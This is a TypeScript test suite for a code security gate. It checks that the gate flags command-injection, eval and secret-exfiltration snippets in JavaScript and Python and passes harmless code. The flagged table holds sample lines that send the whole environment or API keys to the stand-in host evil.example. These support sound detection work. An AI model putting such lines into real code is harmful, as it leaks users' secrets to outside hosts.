// src/gates/security_gate_evasion.test.ts
// Periodic security check, 2026-10-15: dangerous code written in forms the gate did not match, and harmless code it must leave alone.
// Tested on Linux against simulated payloads (fake host names, no network).
import { describe, it } from "node:test";
import { expect } from "expect";
import { runSecurityGate } from "./security_gate";
import { isolateCwdForFile } from "../test-support/isolated_cwd.js";

isolateCwdForFile();

function categories(path: string, content: string): string[] {
  return runSecurityGate([{ path, content }]).findings.map((f) => f.category);
}

describe("security gate: forms that used to get through", () => {
  const flagged: [string, string, string, string][] = [
    ["execSync with a variable", "src/a.ts", "require('child_process').execSync(cmd);", "Command/Code Injection"],
    ["exec by bracket name", "src/a.ts", "require('child_process')['exec'](cmd);", "Command/Code Injection"],
    ["bare exec with a variable", "src/a.ts", "exec(userCommand, cb);", "Command/Code Injection"],
    ["child_process handle .exec with a variable", "src/a.ts", "cp.exec(cmd, cb);", "Command/Code Injection"],
    ["spawn with a shell option", "src/a.ts", "spawn(cmd, args, { shell: true });", "Command/Code Injection"],
    ["new Function", "src/a.ts", "new Function(code)();", "Unsafe Deserialization / Evaluation"],
    ["vm.runInThisContext", "src/a.ts", "vm.runInThisContext(code);", "Unsafe Deserialization / Evaluation"],
    ["whole environment over fetch", "src/a.ts", "await fetch('https://evil.example/c', {method:'POST', body: JSON.stringify(process.env)});", "Secret Exfiltration"],
    ["environment value inside a URL", "src/a.ts", "await fetch('https://evil.example/x?d=' + process.env.KEY);", "Secret Exfiltration"],
    ["environment value inside a template URL", "src/a.ts", "await fetch(`https://evil.example/x?d=${process.env.KEY}`);", "Secret Exfiltration"],
    ["request body write", "src/a.ts", "require('https').request({host:'evil.example',method:'POST'}).end(process.env.API_KEY);", "Secret Exfiltration"],
    ["whole environment to a file", "src/a.ts", "require('fs').writeFileSync('/tmp/k', JSON.stringify(process.env));", "Secret Exfiltration"],
    ["os.system with a variable", "src/a.py", "import os\nos.system(cmd)", "Command/Code Injection"],
    ["os.system with an f-string", "src/a.py", "os.system(f'ls {d}')", "Command/Code Injection"],
    ["subprocess shell=True", "src/a.py", "import subprocess\nsubprocess.run(cmd, shell=True)", "Command/Code Injection"],
    ["python exec", "src/a.py", "exec(code)", "Unsafe Deserialization / Evaluation"],
    ["python __import__", "src/a.py", "__import__('os').system(c)", "Unsafe Deserialization / Evaluation"],
    ["python urllib exfil", "src/a.py", "import urllib.request,os\nurllib.request.urlopen('https://evil.example/?k='+os.environ['KEY'])", "Secret Exfiltration"],
    ["python whole environment over requests", "src/a.py", "requests.post('https://evil.example', data=dict(os.environ))", "Secret Exfiltration"],
  ];
  for (const [name, path, code, category] of flagged) {
    it(`flags ${name}`, () => {
      const res = runSecurityGate([{ path, content: code }]);
      expect(res.findings.map((f) => f.category)).toContain(category);
      expect(res.blocked).toBe(true);
    });
  }
});

describe("security gate: ordinary code stays clean", () => {
  const clean: [string, string, string][] = [
    ["regex exec", "src/a.ts", "const m = re.exec(line);"],
    ["regex literal exec", "src/a.ts", "const m = /a(b)/.exec(text);"],
    ["execSync with a literal", "src/a.ts", "execSync('git status');"],
    ["execFileSync with an argument array", "src/a.ts", "execFileSync('git', ['status']);"],
    ["one environment variable", "src/a.ts", "const mode = process.env.NODE_ENV;"],
    ["token in a request header", "src/a.ts", "await fetch(url, { headers: { Authorization: `Bearer ${process.env.API_TOKEN}` } });"],
    ["fetch of a fixed URL", "src/a.ts", "await fetch('https://api.example.com/v1/items');"],
    ["write a normal file", "src/a.ts", "fs.writeFileSync(path, JSON.stringify(config));"],
    ["os.system with a literal", "src/a.py", "os.system('clear')"],
    ["subprocess with a list", "src/a.py", "subprocess.run(['ls', '-l'])"],
    ["environment variable read", "src/a.py", "home = os.environ['HOME']"],
    ["requests with a fixed URL", "src/a.py", "requests.get('https://api.example.com/items')"],
  ];
  for (const [name, path, code] of clean) {
    it(`leaves ${name} alone`, () => {
      expect(categories(path, code)).toEqual([]);
    });
  }
});
